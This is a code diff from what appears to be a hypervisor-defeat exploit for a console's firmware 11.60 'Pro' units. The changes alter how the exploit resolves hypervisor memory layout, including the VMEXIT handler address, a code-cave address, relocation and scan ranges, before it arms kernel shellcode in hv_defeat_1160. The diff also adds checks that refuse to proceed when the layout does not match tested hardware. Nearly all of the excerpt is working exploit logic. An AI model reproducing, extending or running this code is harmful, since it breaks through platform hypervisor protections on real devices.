@@ -120,11 +120,15 @@ static uint64_t kg(uint64_t offset) { return ktext + offset; }
  * exact measured base and size from the bounded boot metadata before arming
  * the wake carrier.  The regular path intentionally keeps its proven literal.
  */
-static int validate_pro_hv_region_1160(void) {
+int resolve_pro_hv_layout_1160(struct pro_hv_layout_1160 *layout) {
   uint64_t record = kg(OFF_BOOT_METADATA_1160);
   const uint64_t metadata_end = record + BOOT_METADATA_SIZE_1160;
   uint64_t candidate_base = 0, candidate_size = 0;
   int candidates = 0, saw_end = 0;
+
+  if (layout == NULL || fw != 0x1160 ||
+      kernel_get_fw_version() != FW_1160_RAW)
+    return -1;
 
   for (int recno = 0; recno < BOOT_METADATA_MAX_RECORDS_1160; recno++) {
     uint32_t header[2];
@@ -190,9 +194,27 @@ static int validate_pro_hv_region_1160(void) {
     record += advance;
   }
 
-  return saw_end && candidates == 1 &&
-                 candidate_base == HV_REGION_BASE_PRO &&
-                 candidate_size == HV_REGION_SIZE_PRO
+  if (!saw_end || candidates != 1 ||
+      candidate_base != HV_REGION_BASE_PRO ||
+      candidate_size != HV_REGION_SIZE_PRO ||
+      env_offset.HV_HANDLE_VMEXIT_PA != UINT64_C(0x62847551) ||
+      env_offset.HV_CODE_CAVE_PA != UINT64_C(0x62806f00) ||
+      calculate_pro_hv_layout_1160(
+          candidate_base, candidate_size, env_offset.HV_HANDLE_VMEXIT_PA,
+          env_offset.HV_CODE_CAVE_PA, layout) != 0)
+    return -1;
+
+  /* This A/B artifact exercises the dynamic calculation, but still refuses
+   * mutation unless it reproduces the hardware-tested 11.60 geometry. */
+  return layout->code_base == UINT64_C(0x8e0800000) &&
+                 layout->relocation == UINT64_C(0x87e000000) &&
+                 layout->scan_lo == HV_SCAN_LO_PRO &&
+                 layout->scan_hi == HV_SCAN_HI_PRO &&
+                 layout->pointer_lo == HV_REGION_BASE_PRO &&
+                 layout->pointer_hi ==
+                     HV_REGION_BASE_PRO + HV_REGION_SIZE_PRO &&
+                 layout->vmexit_pa == UINT64_C(0x8e0847551) &&
+                 layout->cave_pa == UINT64_C(0x8e0806f00)
              ? 0
              : -1;
 }
@@ -724,6 +746,7 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
   uint64_t resume_cave, sx_ist, facs;
   uint64_t scan_lo = HV_SCAN_LO_REGULAR;
   uint64_t scan_hi = HV_SCAN_HI_REGULAR;
+  struct pro_hv_layout_1160 pro_layout = {0};
   uint64_t zeroes[30] = {0};
   int rc;
 
@@ -740,12 +763,22 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
     return -1;
   }
   if (linux_i.kit_type == KIT_RETAIL_PRO) {
-    if (validate_pro_hv_region_1160()) {
-      notify("11.60 Pro HV metadata did not match; refusing to arm\n");
+    if (resolve_pro_hv_layout_1160(&pro_layout)) {
+      notify("11.60 Pro dynamic HV geometry did not match; refusing to arm\n");
       return -1;
     }
-    scan_lo = HV_SCAN_LO_PRO;
-    scan_hi = HV_SCAN_HI_PRO;
+    scan_lo = pro_layout.scan_lo;
+    scan_hi = pro_layout.scan_hi;
+    printf("11.60 Pro dynamic HV: region 0x%llx size 0x%llx delta "
+           "0x%llx scan 0x%llx..0x%llx VMEXIT 0x%llx cave 0x%llx\n",
+           (unsigned long long)pro_layout.region_base,
+           (unsigned long long)pro_layout.region_size,
+           (unsigned long long)pro_layout.relocation,
+           (unsigned long long)pro_layout.scan_lo,
+           (unsigned long long)pro_layout.scan_hi,
+           (unsigned long long)pro_layout.vmexit_pa,
+           (unsigned long long)pro_layout.cave_pa);
+    fflush(stdout);
     checkpoint_1160_hv("Pro HV geometry gate passed");
   } else {
     checkpoint_1160_hv("regular HV layout selected");
